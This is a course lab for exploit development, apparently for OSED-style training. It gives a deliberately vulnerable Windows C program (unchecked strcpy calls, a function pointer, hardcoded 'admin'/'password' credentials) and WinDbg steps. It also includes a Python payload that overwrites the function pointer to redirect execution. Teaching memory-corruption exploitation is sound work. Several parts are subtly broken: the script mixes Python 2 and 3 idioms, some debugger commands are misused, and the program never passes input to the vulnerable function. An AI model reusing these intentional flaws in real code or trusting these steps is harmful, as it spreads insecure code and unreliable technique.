# OSED Section 2.1 Lab: Advanced Level - Exploit Development Fundamentals

## Lab Overview
This advanced lab focuses on applying x86 architecture knowledge to real-world exploit development scenarios. Students will analyze vulnerable code, understand memory corruption techniques, and practice fundamental exploit development skills.

## Prerequisites
- Completion of intermediate-level Section 2.1 labs
- Strong understanding of x86 architecture
- Familiarity with buffer overflow concepts
- Basic knowledge of exploit development

## Lab Environment Setup

### Required Software:
- Windows 10/11 (64-bit)
- WinDbg Preview
- Visual Studio or MinGW for C compilation
- Python 3.x for exploit development
- Hex editor (HxD or similar)

### Vulnerable Sample Program:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Global variables for exploit analysis
int global_admin_flag = 0;
char global_secret[64] = "SECRET_KEY_12345";
char global_buffer[256];

// Function prototypes
void admin_function(void);
void user_function(void);
void vulnerable_function(char* input);
void secure_function(char* input, int length);
void exploit_target_function(void);
int check_authentication(char* username, char* password);

// Admin function - target for privilege escalation
void admin_function(void) {
    printf("*** ADMIN ACCESS GRANTED ***\n");
    printf("Secret key: %s\n", global_secret);
    printf("System access level: ROOT\n");
    
    // Simulate admin operations
    system("echo Admin operations executed");
    
    global_admin_flag = 1;
}

// User function - normal user operations
void user_function(void) {
    printf("*** USER ACCESS ***\n");
    printf("Access level: USER\n");
    printf("Available operations: Limited\n");
}

// Vulnerable function with buffer overflow
void vulnerable_function(char* input) {
    char local_buffer[64];
    int local_admin_check = 0;
    void (*function_ptr)(void) = user_function;
    
    printf("Vulnerable function called\n");
    printf("Input length: %d\n", strlen(input));
    
    // Vulnerable strcpy - no bounds checking
    strcpy(local_buffer, input);
    
    printf("Local buffer: %s\n", local_buffer);
    printf("Admin check: %d\n", local_admin_check);
    printf("Function pointer: %p\n", function_ptr);
    
    // Call function through pointer
    function_ptr();
}

// Secure function with bounds checking
void secure_function(char* input, int length) {
    char local_buffer[64];
    
    printf("Secure function called\n");
    
    // Bounds checking
    if (length >= sizeof(local_buffer)) {
        printf("Error: Input too long\n");
        return;
    }
    
    // Safe copy with bounds checking
    strncpy(local_buffer, input, sizeof(local_buffer) - 1);
    local_buffer[sizeof(local_buffer) - 1] = '\0';
    
    printf("Safe buffer: %s\n", local_buffer);
}

// Target function for exploitation
void exploit_target_function(void) {
    printf("*** EXPLOIT TARGET REACHED ***\n");
    printf("This function should not be called normally\n");
    printf("Exploit successful!\n");
    
    // Simulate exploit payload
    global_admin_flag = 1;
    strcpy(global_secret, "EXPLOITED");
}

// Authentication check function
int check_authentication(char* username, char* password) {
    char local_username[32];
    char local_password[32];
    int auth_result = 0;
    
    // Copy user input
    strcpy(local_username, username);
    strcpy(local_password, password);
    
    // Simple authentication check
    if (strcmp(local_username, "admin") == 0 && 
        strcmp(local_password, "password") == 0) {
        auth_result = 1;
    }
    
    return auth_result;
}

int main() {
    char user_input[512];
    char username[64];
    char password[64];
    
    printf("=== Advanced Exploit Development Lab ===\n");
    printf("Starting vulnerable application...\n");
    
    // Initialize global variables
    memset(global_buffer, 0, sizeof(global_buffer));
    global_admin_flag = 0;
    
    printf("Global admin flag: %d\n", global_admin_flag);
    printf("Global secret: %s\n", global_secret);
    
    // Simulate user input scenarios
    printf("\n=== Scenario 1: Normal Operation ===\n");
    vulnerable_function("Normal input");
    
    printf("\n=== Scenario 2: Authentication Test ===\n");
    strcpy(username, "user");
    strcpy(password, "wrongpass");
    int auth = check_authentication(username, password);
    printf("Authentication result: %d\n", auth);
    
    printf("\n=== Scenario 3: Secure Function Test ===\n");
    secure_function("Safe input", 10);
    
    printf("\n=== Scenario 4: Exploit Target Analysis ===\n");
    printf("Exploit target function address: %p\n", exploit_target_function);
    printf("Admin function address: %p\n", admin_function);
    printf("User function address: %p\n", user_function);
    
    // Keep process alive for exploitation
    printf("\nProcess ready for exploitation analysis...\n");
    printf("Use WinDbg to analyze memory layout and develop exploits\n");
    
    Sleep(30000); // Keep alive for 30 seconds
    
    return 0;
}
```

## Lab Exercises

### Exercise 1: Memory Layout Analysis for Exploitation
**Duration:** 60 minutes
**Difficulty:** Advanced

#### Objective:
Analyze memory layout to identify exploitation opportunities.

#### Tasks:

1. **Compile and Launch Program**
   ```bash
   gcc -g -o exploit_sample.exe exploit_sample.c
   ```

2. **Function Address Analysis**
   ```windbg
   # Attach to process and load symbols
   .reload
   
   # Get function addresses
   x exploit_sample!admin_function
   x exploit_sample!user_function
   x exploit_sample!exploit_target_function
   x exploit_sample!vulnerable_function
   ```

3. **Global Variable Analysis**
   ```windbg
   # Analyze global variables
   d exploit_sample!global_admin_flag
   d exploit_sample!global_secret
   d exploit_sample!global_buffer
   
   # Calculate addresses
   ? exploit_sample!global_admin_flag
   ? exploit_sample!global_secret
   ```

4. **Stack Layout Analysis**
   ```windbg
   # Set breakpoint in vulnerable function
   bp vulnerable_function
   g
   
   # Analyze stack layout
   k
   d esp
   d ebp
   
   # Analyze local variables
   dv
   ```

#### Expected Challenges:
- Understanding memory layout for exploitation
- Identifying target addresses
- Analyzing stack frame structure

### Exercise 2: Buffer Overflow Exploitation
**Duration:** 90 minutes
**Difficulty:** Advanced

#### Objective:
Develop and execute a buffer overflow exploit.

#### Tasks:

1. **Buffer Overflow Analysis**
   ```windbg
   # Analyze vulnerable function
   uf vulnerable_function
   
   # Set breakpoint and analyze
   bp vulnerable_function
   g
   
   # Analyze local buffer
   d local_buffer
   d local_admin_check
   d function_ptr
   ```

2. **Exploit Development**
   ```python
   # Python exploit script
   import struct
   
   # Target addresses (replace with actual addresses from WinDbg)
   TARGET_FUNCTION = 0x00401000  # exploit_target_function address
   
   # Create exploit payload
   payload = "A" * 64  # Fill buffer
   payload += "B" * 4  # Overwrite local_admin_check
   payload += struct.pack("<I", TARGET_FUNCTION)  # Overwrite function_ptr
   
   print("Exploit payload length:", len(payload))
   print("Payload:", payload.encode('hex'))
   ```

3. **Exploit Testing**
   ```windbg
   # Test exploit in WinDbg
   ea local_buffer "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   ea local_admin_check 0x42424242
   ea function_ptr 0x00401000  # Replace with actual address
   
   # Continue execution
   g
   ```

4. **Exploit Verification**
   ```windbg
   # Check if exploit worked
   d exploit_sample!global_admin_flag
   d exploit_sample!global_secret
   ```

#### Expected Challenges:
- Calculating exact buffer sizes
- Finding correct target addresses
- Understanding calling conventions
- Handling exploit reliability

### Exercise 3: Advanced Memory Manipulation
**Duration:** 75 minutes
**Difficulty:** Advanced

#### Objective:
Practice advanced memory manipulation techniques for exploit development.

#### Tasks:

1. **Return Address Overwrite**
   ```windbg
   # Analyze return address
   k
   d esp
   
   # Calculate return address location
   ? esp + 4
   ? ebp + 4
   ```

2. **Function Pointer Manipulation**
   ```windbg
   # Analyze function pointer
   d function_ptr
   
   # Overwrite function pointer
   ea function_ptr 0x00401000  # Target function address
   
   # Verify overwrite
   d function_ptr
   ```

3. **Global Variable Manipulation**
   ```windbg
   # Overwrite global variables
   ea global_admin_flag 1
   ea global_secret "HACKED"
   
   # Verify changes
   d exploit_sample!global_admin_flag
   d exploit_sample!global_secret
   ```

4. **Shellcode Injection Simulation**
   ```windbg
   # Find suitable memory location
   !address
   
   # Inject shellcode pattern
   ea 0x00120000 "AAAA"  # NOP sled
   ea 0x00120004 "BBBB"  # Shellcode pattern
   ea 0x00120008 "CCCC"  # More shellcode
   
   # Verify injection
   d 0x00120000
   ```

#### Expected Challenges:
- Understanding memory protection
- Finding suitable injection locations
- Handling memory alignment
- Avoiding detection

## Lab Deliverables

### 1. Exploitation Analysis Report
- Memory layout analysis
- Target identification
- Vulnerability assessment
- Exploit feasibility analysis

### 2. Exploit Development Documentation
- Exploit payload design
- Address calculations
- Exploit testing results
- Success/failure analysis

### 3. Advanced Techniques Demonstration
- Memory manipulation techniques
- Exploit payload execution
- Bypass techniques
- Mitigation analysis

## Assessment Criteria

### Excellent (90-100%):
- Complete exploitation analysis
- Successful exploit development
- Advanced technique demonstration
- Clear documentation

### Good (80-89%):
- Most analysis completed
- Basic exploit development
- Some advanced techniques
- Adequate documentation

### Satisfactory (70-79%):
- Limited analysis
- Minimal exploit development
- Few advanced techniques
- Basic documentation

### Needs Improvement (<70%):
- Incomplete analysis
- No exploit development
- No advanced techniques
- Inadequate documentation

## Troubleshooting

### Common Issues:

1. **Address Calculation Errors**
   - Verify addresses in WinDbg
   - Use proper endianness
   - Check address validity

2. **Exploit Reliability Issues**
   - Test multiple times
   - Handle edge cases
   - Verify payload integrity

3. **Memory Protection Issues**
   - Check memory permissions
   - Use appropriate techniques
   - Handle DEP/ASLR

## Next Steps
After completing this advanced lab:
1. Practice with real-world vulnerabilities
2. Study modern exploit techniques
3. Learn about mitigation bypasses
4. Prepare for expert-level challenges

## Additional Resources
- Exploit Development Tutorials
- Buffer Overflow Techniques
- Memory Corruption Exploitation
- Modern Mitigation Bypasses
